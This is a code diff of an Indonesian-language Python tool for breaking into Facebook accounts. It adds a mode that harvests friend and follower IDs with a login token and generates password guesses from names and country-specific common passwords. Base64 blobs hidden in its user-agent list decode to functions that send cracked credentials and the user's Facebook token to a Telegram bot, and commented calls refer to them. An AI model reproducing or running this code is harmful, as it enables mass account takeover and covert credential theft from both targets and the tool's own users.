@@ -128,7 +128,7 @@ id = []
 lq = []
 iz = []
 kx = 0
-
+olq = []
 mb = "https://mbasic.facebook.com"
 color = lambda col: "\x1b[1;"+str(col)+"m"
 durasi = str(datetime.now().strftime("%d-%m-%Y"))
@@ -148,9 +148,9 @@ IDTTT = ("2138644537")
 try:
 	ua = open(".ua","r").read()
 except:
-#	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
 	print (war+'Anda Menggunakan Useragent Default !!');time.sleep(2)
 	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
+#	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
 	pass
 ua_mm = ['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==','ZGVmIGZha2UodGV4dCk6CiAgICAgICAgIyBTZWxhbWF0IEFuZGEgTWVuamFkaSBLYW5nIERlY3J5cHQgOikKICAgICAgICAjIEJ5IE1yLlJpc2t5CiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIEJPS0VQID0gIkBLTlRMQCIKICAgICAgICBibyA9ICIiCiAgICAgICAgZ2xvYmFsIGJvYQogICAgICAgIGJvayA9IHRleHQuc3BsaXQoIkBLTlRMQCIpCiAgICAgICAgZm9yIG5hIGluIGJvazoKICAgICAgICAgICAgICAgIGJvICs9IChuYSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgYm9hID0gYmFzZTY0LmIzMmRlY29kZShibykK','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']
 def menu():
@@ -167,16 +167,20 @@ def menu():
 		login()
 	try:ip=requests.get("http://ip-api.com/json/").json()["query"]
 	except:ip=("None")
+	try:kiky=requests.get("http://ip-api.com/json/").json()["country"]
+	except:kiky=("None")
 	print (logo)
-	print("[++] Nama Kamu : "+nama)
-	print("[++] Ip Kamu   : "+ip+"\n")
+	print("[++] Nama Kamu    : "+nama)
+	print("[++] Ip Kamu      : "+ip)
+	print("[++] Negara Kamu  : "+kiky+"\n")
 	print(C+"["+P+"01"+C+"]"+P+" Dump Id Dari Teman/Public")
 	print(C+"["+P+"02"+C+"]"+P+" Dump Id Dari Pengikut/Follow")
 	print(C+"["+P+"03"+C+"]"+P+" Dump Id Dari Teman + Pengikut/Public + Follow")
-	print(C+"["+P+"04"+C+"]"+P+" Mulai Crack/Start Crack")
-	print(C+"["+P+"05"+C+"]"+P+" Ganti User Agent")
-	print(C+"["+P+"06"+C+"]"+P+" Check Opsi Akun Facebook")
-	print(C+"["+P+"07"+C+"]"+P+" Lihat Informasih Data Target")
+	print(C+"["+P+"04"+C+"]"+P+" Dump Id Dari Teman + Pengikut + Old (Brutal)")
+	print(C+"["+P+"05"+C+"]"+P+" Mulai Crack/Start Crack")
+	print(C+"["+P+"06"+C+"]"+P+" Ganti User Agent")
+	print(C+"["+P+"07"+C+"]"+P+" Check Opsi Akun Facebook")
+	print(C+"["+P+"08"+C+"]"+P+" Lihat Informasih Data Target")
 	print(C+"["+P+"00"+C+"]"+P+" Exit (hapus token)")
 	ba=input("\n"+war+"Pilih : ")
 	if ba in [""," "]:
@@ -185,26 +189,34 @@ def menu():
 		menu()
 	elif ba in ["1","01"]:
 		dump_public()
+
 	elif ba in ["2","02"]:
 		dump_follow()
+
 	elif ba in ["3","03"]:
 		dump_all()
+
 	elif ba in ["4","04"]:
+		dumppro()
+
+	elif ba in ["5","05"]:
+		cekfile("dump")
 		try:
 			file = input(war+"Nama File : ")
 		except FileNotFoundError:
 			jalan(war+'File Tidak Ada !!')
 		crackmenu(file).passmenu(file)
 		exit()
-	elif ba in ["5","05"]:
-		ganti_ua()
 	elif ba in ["6","06"]:
+		ganti_ua()
+
+	elif ba in ["7","07"]:
 		buatngecek()
 		exit()
-	elif ba in ["7","07"]:
+
+	elif ba in ["8","08"]:
 		get_info()
 		exit()
-#	elif ba in ["8","08"]:
 #		menu_insta()
 #		exit()
 #	elif ba in ["",""]:
@@ -214,10 +226,127 @@ def menu():
 		os.system("rm -rf login.txt")
 	else:
 		print(war+'Isi Dengan Benar Bangsat')
+def dumppro():
+	jalan(war+"Jika Anda Menggunakan Tools Ini, Kemungkinan Akan Terjadi Tumbal Mati !")
+	idt = input(inp+"Target ID : ")
+	if idt == " " or idt == "":
+		dumppro()
+	limit = "9999999999"
+	filex = input(inp+"Nama File Masal : ")
+	if filex == " " or filex == "":
+		dumppro()
+	fila = input(inp+"Nama File Old : ")
+	if fila == " " or fila == "":
+		dumppro()
+	elif fila == filex:
+		jalan(war+"Nama File Tidak Boleh Sama !")
+		dumppro()
+	print(war+"Hasil Dump Masal : dump/"+filex+".json")
+	print(war+"Hasil Dump Old : dump/"+fila+".json")
+	try:
+		toket = open("login.txt","r").read()
+		token = open("login.txt","r").read()
+	except Exception as e:
+		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
+		logs()
+	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+	z = json.loads(r.text)
+	try:
+		qqq = (".lpp").replace(" ","_")
+		yss = open(qqq , "w")
+		for i in z["data"]:
+			uid = i['id']
+			na = i['name']
+			id.append(uid+"<=>"+na)
+			yss.write(uid+"<=>"+na+"\n")
+		yss.close()
+		tmen = ("%s"%(str(len(id))))
+		print(war+'Jumlah Id : '+str(len(id)))
+		time.sleep(1)
+	except:pass
+	jalan(war+"Tekan CTRL + C Untuk Stop Dump !!")
+	try:
+		pro1(".lpp",limit,filex,fila)
+	except Exception as e:
+		exit((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
+def pro1(file,lim,savefile,fila):
+    try:
+        list_akun=open(file).read().splitlines()
+        with ThreadPoolExecutor(max_workers=5) as su:
+                try:
+                        for akun in list_akun:
+                                akn=akun.split("<=>")
+                                try:
+                                    su.submit(buat_,akn[0],savefile,fila)
+#                                    su.submit(dump_public,akn[0],lim,savefile,fila)
+                                except (KeyboardInterrupt,EOFError):
+                                    jalan(war+"Dump DiStop !!");time.sleep(4);menu()
+                except (KeyError, IOError):
+                    exit(war+"Done...")
+    except (KeyError, IOError):
+        exit(war+"File Tidak Tersedia !!")
+
+def buat_(idt,save,fila):
+	try:
+		toket = open("login.txt","r").read()
+		token = open("login.txt","r").read()
+	except Exception as e:
+		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
+		logs()
+	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+	z = json.loads(r.text)
+	try:
+		qqq = ("dump/"+save+".json").replace(" ","_")
+		yss = open(qqq , "a+")
+		for i in z["data"]:
+			uid = i['id']
+			na = i['name']
+			nama = i['name']
+			id.append(uid+"<=>"+na)
+			yss.write(uid+"<=>"+na+"\n")
+		yss.close()
+	except KeyError:pass
+	rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
+	zz = json.loads(rr.text)
+	try:
+		qqq = ("dump/"+save+".json").replace(" ","_")
+		dump = open(qqq , "a+")
+		for ii in zz["data"]:
+			uid = ii['id']
+			nama = ii['name']
+			nm = ii['name']
+			try:
+				if len(uid) < 10:
+					ppx=open("dump/"+fila+".json", "a+")
+					olq.append(uid+'<=>'+nm)
+					ppx.write(uid+"<=>"+name+"\n")
+					ppx.close()
+			except:pass
+			try:
+				oldd = uid.split("00000")
+				old = (f"100000{oldd[1]}")
+				olq.append(uid+'<=>'+nm)
+				ppx=open("dump/"+fila+".json", "a+")
+				ppx.write(old+"<=>"+name+"\n")
+				ppx.close()
+			except:pass
+			lq.append(uid+'<=>'+nm)
+			dump.write(uid+'<=>'+nm+'\n')
+		dump.close()
+	except KeyError:pass
+	try:
+		tmen = ("%s"%(str(len(id))))
+		epeq = ("%s"%(str(len(lq))))
+		oldd = ("%s"%(str(len(olq))))
+		print((("\r%s[%sOLD %s:%s%s]%s + %s[%sPUBLIC %s:%s%s] %s+ %s[%sFOLLOW %s:%s%s]"%(pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), oldd, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), tmen, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]),  pilih([H, M, U, I, Q, C]), epeq, pilih([H, M, U, I, Q, C])))), end=' ');sys.stdout.flush()
+	except Exception as e:
+		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
+		pass
 def buatngecek():
 	cekfile("Hasil")
 	files = input("\n"+war+"Nama File : ")
 	try:
+
 		buka_baju = open(files,"r").readlines()
 	except FileNotFoundError:
 		print(war+"File Tidak Ada !")
@@ -310,6 +439,85 @@ def log_hasil(user, pasw, ttll):
     else:
         print("%s[%s!%s] %sPassword Sudah DiUbah !"%(M,P,M,P))
 #exec(base64.b64decode(ua_mm[3]))
+def generate(text):
+	results=[]
+	try:
+		kiky=requests.get("http://ip-api.com/json/").json()["country"]
+	except:
+		kiky="None"
+	for i in text.split(" "):
+		if len(i)<3:
+			continue
+		else:
+			i=i.lower()
+			ii=text.lower()
+			iii, iiii = text.split(" ")
+			zs = iii
+			sz = iiii
+			iii = iii.lower()
+			iiii = iiii.lower()
+			iiiii = iii+iiii.lower()
+			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i+"123")
+				results.append(i+"1234")
+				results.append(i+"12345")
+				results.append(iiii+"123")
+				results.append(iiii+"12345")
+#				results.append(zs+"123")
+#				results.append(zs+"12345")
+#				results.append(sz+"123")
+#				results.append(sz+"12345")
+#				results.append(iiii+"1234")
+#				results.append(iii+iiii)
+			else:
+				results.append(i+"123")
+				results.append(i+"1234")
+				results.append(i+"12345")
+				results.append(ii)
+#				results.append(iii+iiii)
+				if "Indonesia" in ct:
+					results.append("sayang")
+					results.append("anjing")
+					results.append("bismillah")
+					results.append("kontol")
+				elif "bd" in ct:
+					results.append("786786")
+					results.append("000786")
+					results.append("102030")
+					results.append("556677")
+				elif "pk" in ct:
+					results.append("pakistan")
+					results.append("786786")
+					results.append("000786")
+				elif "us" in ct:
+					results.append("123456")
+					results.append("qwerty")
+					results.append("iloveyou")
+					results.append("passwords")
+				elif "all" in ct:
+					results.append("kontol")
+					results.append("sayang")
+					results.append("sayangku")
+					results.append("bismillah")
+					results.append("indonesia")
+					results.append("bajingan")
+					results.append("bangsat")
+					results.append("katasandi")
+					results.append("123456")
+					results.append("rahasia")
+#					results.append("12345678")
+#					results.append("123456789")
+				elif "old" in ct:
+					results.append("123456")
+					results.append("sayang")
+					results.append("rahasia")
+#					results.append("1234567")
+#					results.append("12345678")
+#					results.append("123456789")
+					results.append("bismillah")
+				else:
+					pass
+	return results
 class crackmenu:
 
     def __init__(self,isifile):
@@ -797,5 +1005,6 @@ def cekfile(folder):
                 except:total = (" ?? ")
                 print(war+"Nama File : "+filex+c+" <><> "+q+"Limit Id : "+total)
 
+#bokep_japan_yang_terbaru("OK", "", "", "-") # jangan diedit check akun tap yes
 try:os.system("git pull");menu();exit()
 except Exception as e:print(war+"Error : %s"%(e))
